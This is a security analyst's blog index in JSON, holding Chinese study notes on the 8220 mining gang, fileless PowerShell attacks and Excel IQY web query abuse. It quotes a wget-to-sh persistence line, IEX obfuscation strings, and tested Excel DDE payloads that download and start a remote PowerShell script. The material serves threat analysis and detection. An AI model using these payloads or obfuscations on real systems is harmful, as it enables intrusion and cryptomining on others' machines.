{"meta":{"title":"hait`blogs","subtitle":"","description":"","author":"hait jia","url":"https://xiaoxiaowensheng.github.io","root":"/"},"pages":[{"title":"友情链接","text":"123","path":"links/index.html"},{"title":"分类","text":"","path":"categories/index.html"},{"title":"关于","text":"个人详细介绍","path":"about/index.html"},{"title":"书单","text":"","path":"books/index.html"},{"title":"404 Not Found：该页无法显示","text":"","path":"/404.html"},{"title":"Repositories","text":"","path":"repository/index.html"},{"title":"标签","text":"","path":"tags/index.html"},{"title":"成就","text":"","path":"archives/index.html"}],"posts":[{"title":"8220挖矿团伙学习分析","text":"8220挖矿团伙学习分析 历史报告阅读：奇安信披露： https://ti.qianxin.com/blog/articles/8220-mining-gang-in-china/ 腾讯披露： https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247486539&amp;idx=1&amp;sn=724462c15a1ffe78c94ac988d0c3f0f9&amp;scene=21#wechat_redirect 现场发现情况：客户机器从http://104.244.75.25的80端口下载.sh.tgz文件，本次分析发现攻击者使用的是weblogic漏洞打进来上传jsp木马，又通过木马文件下载恶意样本。 通过该木马历史攻击手段学习：活动事件线： 涉及漏洞点：WebLogic漏洞攻击事件攻击者利用WebLogicXMLDecoder反序列化漏洞（编号CVE-2017-10271[4]）攻击服务器，并获取服务器控制权限，进而植入挖矿木马进行挖矿。该漏洞出现在WebLogicServer Security Service中，影响WebLogic Server12.2.1.2.0及其之前的版本。利用此漏洞，攻击者下载名为2.ps1的PowerShell脚本并执行。脚本进而会下载挖矿木马程序，进行挖矿活动。同时，该脚本也会终止其他挖矿程序运行，保证自己独占CPU资源。 Drupal漏洞利用Drupal的远程任意代码执行漏洞是由于Drupal对表单的渲染引起的。为了能够在表单渲染对过程中动态修改数据，Drupal引入了“DrupalRender API”机制[7]，“Drupal RenderAPI”对于#会进行特殊处理，其中#pre_render在render之前操作数组，#post_render接收render的结果并在其添加包装，#lazy_builder用于在render过程的最后添加元素。由于对于部分#属性数组值，Drupal会通过call_user_func的方式进行处理，导致任意代码执行。漏洞验证POC[8]，利用此POC可快速验证Drupal是否存在该漏洞。（https://github.com/a2u/CVE-2018-7600） “8220挖矿团伙”利用此漏洞下载并执行挖矿程序。其中的Shell恶意脚本代码将wget -qhttp://192.99.142.235:8220/logo4.jpg -O - |sh命令写入任务计划，实现对服务器的持续感染。同时从192.99.142.235:8220下载配置文件3.json和挖矿程序rig，分别保存为config.json和sustes，最后利用nohup命令在后台运行挖矿。 其它漏洞利用列表 服务 利用说明 JBoss 利用JBoss反序列化命令执行漏洞（编号CVE-2017-12149[9]），漏洞影响5.X和6.X版本。利用此漏洞可在未经任何身份验证的服务器主机上执行任意代码。”8220挖矿团伙”利用此漏洞下载并执行PowerShell脚本，进行挖矿活动。 （http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12149） Couchdb 利用Couchdb的组合漏洞（编号CVE-2017-12635[10], CVE–2017–12636[11]）。利用CVE-2017-12635漏洞，可以给自身添加管理员权限；利用CVE-2017-12636，可以实现远程任意代码执行。”8220挖矿团伙”利用这两个漏洞完成对目标的攻击，进行挖矿活动。 （http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12635、http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12636 ） Redis Redis默认情况下运行在0.0.0.0:6379上。若Redis服务暴露在公网，同时没有开启认证，则攻击者可以在未授权的情况下访问Redis服务，执行恶意操作。”8220挖矿团伙”通过网络扫描工具，发现存在该漏洞的主机，并进行攻击，实现挖矿活动。 Hadoop Yarn Yarn的ResourceManager UI默认运行在0.0.0.0:8088端口上，允许用户通过接口进行相关的应用创建、任务提交执行等操作。若该服务暴露在公网，同时没有开启认证，则攻击者可以在未授权访问的情况下执行恶意操作。”8220挖矿团伙”利用此漏洞进行远程命令执行，实现挖矿活动。 https://www.cnblogs.com/qcloud1001/p/9173253.html Kubernetes Kubelet默认开启10255和10250端口，攻击者可以在未授权的情况下执行恶意操作。”8220挖矿团伙”利用该漏洞，远程执行下载脚本的命令，实现在容器中的挖矿活动。 https://blog.csdn.net/weixin_30267785/article/details/99456781 https://www.cnblogs.com/birdstudio/p/7650622.html https://www.cnblogs.com/elisun/p/7113745.html tomcat 通过Tomcat Manager后台弱口令进行爆破，爆破成功后，黑客上传了一个war包（jexws3.war），该war包中包含了一个Jsp webshell（jexws3.jsp），并且该webshell拥有最高权限。黑客通过Jsp webshell执行命令下载勒索病毒和挖矿木马https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247486214&amp;idx=1&amp;sn=a54b0830a8b629b433f3cadae0ae19e2&amp;scene=21#wechat_redirect Docker镜像利用（供应链攻击）奇安信威胁情报中心还发现国外一篇关于DockerHub镜像的安全研究报告[12]中，疑似出现“8220挖矿团伙”的身影。报告指出，从2017年05月注册账号开始，到2018年05月删除账号结束，该账号陆续上传了17个恶意docker镜像，镜像下载量达到500万次以上。这些镜像的功能大致可分为如下四类： 反弹主机的SHELL 向主机中添加SSH公钥 在主机中添加任务计划 利用镜像完成挖矿","path":"2020/01/23/8220挖矿团伙学习分析/"},{"title":"无文件攻击学习","text":"无文件攻击学习无文件攻击介绍“无文件攻击”是指恶意程序文件没有直接落地到目标系统的磁盘空间的攻击手法，一般情况下，“无文件攻击”会把攻击载荷直接载入到内存空间中执行，或者依附于合法的系统进程来进行恶意操作。 “无文件攻击”的发展“无文件攻击”起源完全驻留在内存中的恶意代码在21世纪前就已经出现，无需落地在目标的磁盘 • 2001年，红色代码事件才将“无文件恶意软件”一次带给公众 • 2003年，Slammer蠕虫是另一个经典的“无文件恶意软件”实例 现代“无文件攻击”的异同现代的“无文件攻击”大多是基于Powershell的 • 整个攻击链、攻击步骤完全无文件 • 恶意代码依附于可信的系统进程，也称为“无文件攻击” • “无文件攻击”极其善于躲避检测、对抗杀软 常见“无文件”攻击技术解析 https://www.jianshu.com/p/cb75c0d70c45 案例分析学习驱动人生挖矿蠕虫攻击过程分析（powershell分析）趋势针对驱动人生事件介绍： https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/ 腾讯对驱动人生介绍： https://s.tencent.com/research/report/768.html mig.ps1（最初的起始powershell文件）沙箱运行：【比较详细】 https://app.any.run/tasks/8586e6bb-6236-40d0-b608-ca6e466aa022/ m6pe（最终挖矿样本）沙箱运行： http://tq.research.qianxin-inc.cn/tq/report/toViewReport.do?rid=00c9c724043ce628ce8109a3826f8f2b&amp;sk=006363 使用write-host，write-output **** | out-file -filepathC:\\temp\\a.txt替换IEX进行解密： 期间混淆使用替换IEX的代码： IEX： $pSHoMe[4]+$pshomE[34]+’x’ $env:coMSpEc[4,26,25]-jOiN’’ $pSHomE[21]+$PSHoME[30]+’x’ $sHEllid[1]+$sHElLID[13]+’x’ $env:ComspeC[4,15,25]-JoIN’’ (GeT-VAriaBlE ‘*Mdr*‘).NaMe[3,11,2]-JOiN’’ 利用WMI构建无文件后门https://www.freebuf.com/column/165235.html GhostMiner解析：无文件挖矿的新姿势https://www.freebuf.com/articles/blockchain-articles/170807.html 针对JS_POWMET无文件恶意软件的分析https://bbs.pediy.com/thread-220646.htm 防御手段取证并非毫无头绪的，病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll/so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。 流量、内存、模块、启动项。","path":"2020/01/23/无文件攻击学习/"},{"title":"iqy学习","text":"iqy学习 知识点 IQY 到底是什么内置在 excel 中的一种特殊的’web 浏览器’,通过 IQY[即 web 查询]语句,可以直接将各类web 上的列表数据轻松引入到当前的 excel中，当打开该文件时将执行Web查询或远程命令。 IQY 怎么用？ 直接excel数据导入： 流量特征： 导入过程存在多次http请求，其中包括HEAD、OPTION、GET方法，使用agent不同： GET：User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0; ms-office) OPTIONS：User-Agent: Microsoft Office Protocol Discovery HEAD：User-Agent: Microsoft Office Existence Discovery 这种方法如果是可执行文件提示是否执行： User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; wbx 1.0.0) 点击运行： GET请求txt文件内容之前有4次OPTION请求,然后GET请求： OPTIONS：User-Agent:Microsoft Office Protocol Discovery GRT：User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64;Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NETCLR 3.5.30729; wbx 1.0.0; ms-office) 恶意利用IQY执行payloadexcel会加载远程拉取的内容，如果是程序会去执行 excel===&gt;&gt;cmd运行命令 ***可以自己写iqy文件，也可以调用nishang上的powershell 举例说明： 远程代码：=cmd|‘/c calc.exe’!A0 流量上还是一样： GET请求txt文件内容之前有4次OPTION请求,然后GET请求： OPTIONS：User-Agent:Microsoft Office Protocol Discovery User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64;Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NETCLR 3.5.30729; wbx 1.0.0; ms-office) GET请求txt文件内容之前有4次OPTION请求 把calc.exe替换成其他的命令也是一样的，包括CS，msf，empire的上线 失败测试：=cmd|‘/c powershell “IEX (New-ObjectNet.WebClient).DownloadString(‘http://118.24.24.45/1.ps1&#39;)&quot;&#39;!A0 ‘和“不能加一层包裹 成功测试：=cmd|‘/c powershell invoke-webrequest“http://118.24.24.45:9999/1.ps1&quot; -outfile “$env:temp\\2.ps1”;start-process“C:\\Users\\jiahaitao01\\Desktop\\2.ps1”’!A0 测试最新版win10 +office19 User-Agent: Microsoft Office Excel 2014 User-Agent: Microsoft Office Protocol Discovery\\r\\n User-Agent: Microsoft Office Excel\\r\\n User-Agent: Mozilla/4.0 (compatible; ms-office)\\r\\n 失败，不能执行命令 案例分析利用IQY(Excel Web Query)文件分发https://mp.weixin.qq.com/s?__biz=MzA4ODEyODA3MQ==&amp;mid=2247485241&amp;idx=1&amp;sn=05c4556273b546e7bd7637650edacda1 powershell学习 https://github.com/HugoWw/Powershell/tree/b0273d65ebd25c523e8a7443088d736fc75ec783/nishang-master","path":"2020/01/23/iqy学习/"},{"title":"安全分析","text":"威胁分析业务部","path":"2020/01/22/安全分析/"}]}